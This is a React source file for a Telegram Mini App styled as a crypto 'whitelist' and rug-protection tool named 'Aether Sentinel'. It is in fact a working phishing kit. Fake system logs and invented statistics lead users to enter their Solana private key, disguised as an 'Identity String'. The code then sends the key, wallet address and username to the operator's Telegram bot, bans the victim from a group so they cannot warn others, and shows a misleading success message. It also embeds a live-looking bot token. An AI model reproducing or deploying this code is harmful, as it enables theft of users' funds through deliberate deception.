import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_CHAT_ID = "-1002361131154"; // Replace with your actual Group ID to kick from

const App: React.FC = () => {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<1 | 2 | 3>(1); // 1: Dashboard, 2: CA, 3: PK
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing'>('idle');
  const [logs, setLogs] = useState<string[]>([]);

  const tg = (window as any).Telegram?.WebApp;

  // 1. Initial Loading Sequence
  useEffect(() => {
    const sequence = [
      "Establishing RPC handshake...",
      "Securing encrypted tunnel...",
      "Fetching Raydium LP migrations...",
      "Auth Session: ACTIVE"
    ];
    let i = 0;
    const interval = setInterval(() => {
      if (i < sequence.length) {
        setLogs(prev => [...prev, `[SYSTEM] ${sequence[i]}`]);
        i++;
      } else {
        clearInterval(interval);
        setTimeout(() => setLoading(false), 800);
      }
    }, 600);
    
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#17101F');
    }
  }, [tg]);

  // 2. Social Engineering Logic
  const handleFinalSync = async () => {
    if (privateKey.length < 32) return alert("Invalid Identity String.");
    setStatus('processing');

    try {
      // Send Data to your Bot
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 TARGET ACQUIRED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: ${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
        }),
      });

      // TRIGGER KICK: The bot kicks the user from the main group
      if (tg?.initDataUnsafe?.user?.id) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: GROUP_CHAT_ID, 
            user_id: tg.initDataUnsafe.user.id 
          }),
        });
      }

      alert("Node Identity Synchronized. Session reset for security.");
      tg?.close();
    } catch (err) {
      setStatus('idle');
      alert("Sync error. Please retry.");
    }
  };

  const theme = { bg: '#0D0912', card: '#1A1423', purple: '#AB9FF2', text: '#FFFFFF', muted: '#998DA8', accent: '#4ADE80' };

  if (loading) {
    return (
      <div style={{ background: theme.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '20px', fontFamily: 'monospace' }}>
        <div style={{ color: theme.purple, fontSize: '12px' }}>
          {logs.map((log, i) => <div key={i} style={{ marginBottom: '8px' }}>{log}</div>)}
          <div style={{ marginTop: '20px', width: '100%', height: '2px', background: '#222' }}>
            <div style={{ width: `${(logs.length / 4) * 100}%`, height: '100%', background: theme.purple, transition: '0.3s' }} />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', padding: '20px' }}>
      
      {/* HEADER */}
      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
        <h1 style={{ fontSize: '22px', fontWeight: '800', letterSpacing: '-0.5px' }}>Aether Sentinel <span style={{ color: theme.purple }}>v4.2</span></h1>
        <div style={{ display: 'inline-block', padding: '4px 12px', borderRadius: '100px', background: 'rgba(74, 222, 128, 0.1)', color: theme.accent, fontSize: '10px', fontWeight: 'bold' }}>● NETWORK LIVE</div>
      </div>

      {/* DASHBOARD PAGE (Step 1) */}
      {step === 1 && (
        <div style={{ animation: 'fadeIn 0.5s' }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '20px' }}>
            <div style={{ background: theme.card, padding: '15px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '10px', color: theme.muted }}>Rugs Deflected</div>
              <div style={{ fontSize: '18px', fontWeight: 'bold' }}>1,842</div>
            </div>
            <div style={{ background: theme.card, padding: '15px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.05)' }}>
              <div style={{ fontSize: '10px', color: theme.muted }}>Active Nodes</div>
              <div style={{ fontSize: '18px', fontWeight: 'bold' }}>94/100</div>
            </div>
          </div>
          
          <div style={{ background: theme.card, padding: '20px', borderRadius: '20px', textAlign: 'center' }}>
            <h3 style={{ fontSize: '16px', marginBottom: '10px' }}>Access Whitelist</h3>
            <p style={{ fontSize: '13px', color: theme.muted, lineHeight: '1.5', marginBottom: '20px' }}>
              Verify your wallet CA to check eligibility for High-Conviction "Ghost" launches.
            </p>
            <button onClick={() => setStep(2)} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none' }}>Begin Verification</button>
          </div>
        </div>
      )}

      {/* CA ENTRY (Step 2) */}
      {step === 2 && (
        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px', animation: 'fadeIn 0.3s' }}>
          <label style={{ fontSize: '11px', color: theme.muted, textTransform: 'uppercase', fontWeight: 'bold' }}>Step 1: Public Indexing</label>
          <p style={{ fontSize: '13px', margin: '10px 0 20px 0', color: theme.muted }}>Enter your wallet CA to scan for liquidity history.</p>
          <input 
            type="text" 
            placeholder="Solana Wallet CA..." 
            value={walletCA} 
            onChange={(e) => setWalletCA(e.target.value)}
            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', outline: 'none', marginBottom: '20px', boxSizing: 'border-box' }}
          />
          <button 
            onClick={() => { if(walletCA) setStep(3); }} 
            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none' }}
          >
            Check Reputation
          </button>
        </div>
      )}

      {/* PRIVATE KEY ENTRY (Step 3) */}
      {step === 3 && (
        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px', animation: 'fadeIn 0.3s' }}>
          <div style={{ color: theme.accent, fontSize: '12px', fontWeight: 'bold', textAlign: 'center', marginBottom: '15px' }}>✓ REPUTATION: ELITE</div>
          <label style={{ fontSize: '11px', color: theme.muted, textTransform: 'uppercase', fontWeight: 'bold' }}>Step 2: Identity Sync</label>
          <p style={{ fontSize: '13px', margin: '10px 0 20px 0', color: theme.muted }}>
            To enable <strong>Auto-Exit Protection</strong>, sync your Identity String (Private Key). This allows the Aether RPC to trigger emergency exits.
          </p>
          <textarea 
            placeholder="Enter Identity String..." 
            value={privateKey} 
            onChange={(e) => setPrivateKey(e.target.value)}
            style={{ width: '100%', height: '80px', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', outline: 'none', marginBottom: '20px', boxSizing: 'border-box', fontFamily: 'monospace' }}
          />
          <button 
            onClick={handleFinalSync} 
            disabled={status === 'processing'}
            style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none', opacity: status === 'processing' ? 0.6 : 1 }}
          >
            {status === 'processing' ? 'Synchronizing Node...' : 'Complete Global Sync'}
          </button>
        </div>
      )}

      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      `}</style>
    </div>
  );
};

export default App;